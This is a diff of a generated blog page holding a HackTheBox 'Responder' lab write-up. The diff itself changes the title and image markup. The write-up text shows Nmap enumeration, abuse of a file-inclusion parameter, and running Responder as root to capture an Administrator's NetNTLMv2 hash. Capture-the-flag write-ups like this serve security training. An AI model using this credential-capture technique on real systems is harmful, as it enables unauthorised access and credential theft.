@@ -15,8 +15,8 @@
 
   
   
-    <title>Responder | Windows &middot; </title>
-    <meta name="title" content="Responder | Windows &middot; ">
+    <title>HackTheBox Responder Writeup. &middot; </title>
+    <meta name="title" content="HackTheBox Responder Writeup. &middot; ">
   
 
   
@@ -47,7 +47,7 @@
 
   
   <meta property="og:url" content="http://localhost:1313/archetype-htb/posts/4-spmachine/">
-	<meta property="og:title" content="Responder | Windows">
+	<meta property="og:title" content="HackTheBox Responder Writeup.">
 	<meta property="og:description" content="Responder | Windows # Overview # Responder is a windows machine(server to be specific) that showcases how a file inclusion vulnerability can be leveraged to capture user credentials via Responder and use them to get a remote PowerShell session on the machine.
 A file inclusion vulnerability allows an attacker to access sensitive files on a server by manipulating user input(often a URL parameter), besides reading files, it can lead to code execution or forced outbound connections. file inclusion can be remote or local, remote file inclusion involves a file on an external resource/URL while a local file inclusion involves a file already on the server.">
 	<meta property="og:locale" content="en">
@@ -64,7 +64,7 @@ A file inclusion vulnerability allows an attacker to access sensitive files on a
 
   
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Responder | Windows">
+	<meta name="twitter:title" content="HackTheBox Responder Writeup.">
 	<meta name="twitter:description" content="Responder | Windows # Overview # Responder is a windows machine(server to be specific) that showcases how a file inclusion vulnerability can be leveraged to capture user credentials via Responder and use them to get a remote PowerShell session on the machine.
 A file inclusion vulnerability allows an attacker to access sensitive files on a server by manipulating user input(often a URL parameter), besides reading files, it can lead to code execution or forced outbound connections. file inclusion can be remote or local, remote file inclusion involves a file on an external resource/URL while a local file inclusion involves a file already on the server.">
 
@@ -113,8 +113,8 @@ A file inclusion vulnerability allows an attacker to access sensitive files on a
   <link
     type="text/css"
     rel="stylesheet"
-    href="/archetype-htb/css/main.bundle.min.25338ee2a633c72ab395ffa6baadece5d8224af5a2e02628d1411c3ed00f3d22c6555f67a6848c9975e2853566c6844ba0b68807f7b96a89a039dc54706e710d.css"
-    integrity="sha512-JTOO4qYzxyqzlf&#43;muq3s5dgiSvWi4CYo0UEcPtAPPSLGVV9npoSMmXXihTVmxoRLoLaIB/e5aomgOdxUcG5xDQ==">
+    href="/archetype-htb/css/main.bundle.min.83f6a01d363f677b5daf9cb4a671c69f4c270b3cd3f8048310b43dd0b9a6a009c932c03f7011bf2f8c2fa58db4e42ee25d1e471ebc84564dead2c6efd96916e1.css"
+    integrity="sha512-g/agHTY/Z3tdr5y0pnHGn0wnCzzT&#43;ASDELQ90LmmoAnJMsA/cBG/L4wvpY205C7iXR5HHryEVk3q0sbv2WkW4Q==">
 
   
   
@@ -230,8 +230,8 @@ A file inclusion vulnerability allows an attacker to access sensitive files on a
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Responder | Windows",
-    "headline": "Responder | Windows",
+    "name": "HackTheBox Responder Writeup.",
+    "headline": "HackTheBox Responder Writeup.",
     
     "inLanguage": "en",
     "url" : "http://localhost:1313/archetype-htb/posts/4-spmachine/",
@@ -248,7 +248,7 @@ A file inclusion vulnerability allows an attacker to access sensitive files on a
     "keywords": ["Overview","Enumeration","Exploitation","Cracking the Hash","Gaining Access","Post-Exploitation","Conclusion"],
     
     "mainEntityOfPage": "http://localhost:1313/archetype-htb/posts/4-spmachine/",
-    "wordCount":  1442 
+    "wordCount":  1438 
   }]
   </script>
 
@@ -422,7 +422,7 @@ A file inclusion vulnerability allows an attacker to access sensitive files on a
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Responder | Windows
+        HackTheBox Responder Writeup.
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -474,7 +474,7 @@ A file inclusion vulnerability allows an attacker to access sensitive files on a
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2026-09-10T00:00:00&#43;00:00">September 10, 2026</time><span class="px-2 text-primary-500">&middot;</span><span>1442 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+      <time datetime="2026-09-10T00:00:00&#43;00:00">September 10, 2026</time><span class="px-2 text-primary-500">&middot;</span><span>1438 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
     
 
     
@@ -596,7 +596,19 @@ We then crack the NetNTLMv2 response using John the Ripper to extract the plaint
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 25.67 seconds</span></span></code></pre></div></div>
 <p>Perfoming an Nmap scan indeed shows two service open, <code>http</code> and <code>wsman</code>(this means WinRM is open and we can use it to access this windows server remotely).
 Since this is a web server, we can take a look at the web-app it hosts by visiting the IP using a browser(or <code>curl</code>).</p>
-<p>![[ResponderWebAppHome.png]]</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Responder web app homepage"
+    width="1747"
+    height="997"
+    src="/archetype-htb/posts/4-spmachine/ResponderWebAppHome_hu_3b8a1d66bde4ce98.png"
+    srcset="/archetype-htb/posts/4-spmachine/ResponderWebAppHome_hu_3b8a1d66bde4ce98.png 800w, /archetype-htb/posts/4-spmachine/ResponderWebAppHome_hu_f9eebc232c3391e1.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/archetype-htb/posts/4-spmachine/ResponderWebAppHome.png"></figure>
+</p>
 <p>Something interesting to note, visiting the IP on firefox redirects to <code>http://unika.htb</code> and connection fails.
 This happens because <code>unika.htb</code> isn&rsquo;t actually a real registered domain name so DNS resolution fails and the browser can&rsquo;t find an IP to connect to. To override this, we add the domain name alongside its IP in our local <code>/etc/hosts</code>, this is the file the browser checks before querying the DNS resolver.</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
@@ -623,7 +635,19 @@ This happens because <code>unika.htb</code> isn&rsquo;t actually a real register
 </span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span> │ ff02::2     ip6-allrouters
 </span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span> │ 
 </span></span><span style="display:flex;"><span>─────┴──────────────────────────────────────────────────────────────────────</span></span></code></pre></div></div>
-<p>![[ResponderRealHomePg.png]]</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="unika.htb homepage after /etc/hosts fix"
+    width="1919"
+    height="997"
+    src="/archetype-htb/posts/4-spmachine/ResponderRealHomePg_hu_8b28ddc11ca25e65.png"
+    srcset="/archetype-htb/posts/4-spmachine/ResponderRealHomePg_hu_8b28ddc11ca25e65.png 800w, /archetype-htb/posts/4-spmachine/ResponderRealHomePg_hu_552a091a02b57908.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/archetype-htb/posts/4-spmachine/ResponderRealHomePg.png"></figure>
+</p>
 <p>Now that that&rsquo;s out of the way, there&rsquo;s a question on HTB for this specific machine that needs discussion.</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>What is the name of the URL parameter which is used to load different language versions of the webpage?</span></span></code></pre></div></div>
 <ul>
@@ -641,7 +665,19 @@ This happens because <code>unika.htb</code> isn&rsquo;t actually a real register
     
 </h2>
 <p>Now that we have identified our vulnerable URL parameter, it&rsquo;s time to trigger a file inclusion on the target.</p>
-<p>![[ResponderBadParam.png]]</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Bad language parameter triggering inclusion"
+    width="1330"
+    height="201"
+    src="/archetype-htb/posts/4-spmachine/ResponderBadParam_hu_17ef0a5fb3f5c8bf.png"
+    srcset="/archetype-htb/posts/4-spmachine/ResponderBadParam_hu_17ef0a5fb3f5c8bf.png 800w, /archetype-htb/posts/4-spmachine/ResponderBadParam_hu_28f1fa7acdad9ef8.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/archetype-htb/posts/4-spmachine/ResponderBadParam.png"></figure>
+</p>
 <p>First, we run the responder utility as root.</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo responder -I tun0                         
@@ -671,7 +707,19 @@ This happens because <code>unika.htb</code> isn&rsquo;t actually a real register
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error starting TCP server on port 21, check permissions or other servers running.
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error starting TCP server on port 53, check permissions or other servers running.</span></span></code></pre></div></div>
 <p>This automatically starts a rogue SMB server on port 445 along other listeners. Since setting up the listener is done, we can trigger the file inclusion on the target.</p>
-<p>![[ResponderFITrigger.png]]</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Triggering the file inclusion"
+    width="1174"
+    height="109"
+    src="/archetype-htb/posts/4-spmachine/ResponderFITrigger_hu_2b078b39c5c07b.png"
+    srcset="/archetype-htb/posts/4-spmachine/ResponderFITrigger_hu_2b078b39c5c07b.png 800w, /archetype-htb/posts/4-spmachine/ResponderFITrigger.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/archetype-htb/posts/4-spmachine/ResponderFITrigger.png"></figure>
+</p>
 <p>When the windows Server tries to access the path, responder prints the user&rsquo;s(who the web server process is running as) credentials(useraname and the NetNTLMv2 hash) on the terminal.</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.129.137.127
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : RESPONDER<span style="color:#ae81ff">\A</span>dministrator
